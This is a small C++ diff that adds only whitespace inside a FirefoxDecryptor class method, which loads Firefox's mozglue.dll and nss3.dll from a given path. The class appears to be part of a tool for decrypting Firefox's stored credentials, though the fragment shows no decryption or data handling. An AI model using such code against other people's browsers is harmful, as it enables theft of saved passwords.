@@ -13,7 +13,7 @@ FirefoxDecryptor::~FirefoxDecryptor()
 bool FirefoxDecryptor::init(const String& sPath)
 {
 	try
-	{
+	{	
 		const auto mozglue_dll_path = sPath + "\\mozglue.dll";
 		const auto nss_3_dll_path = sPath + "\\nss3.dll";
 		m_hMozGlue = LoadLibrary(mozglue_dll_path.c_str());		
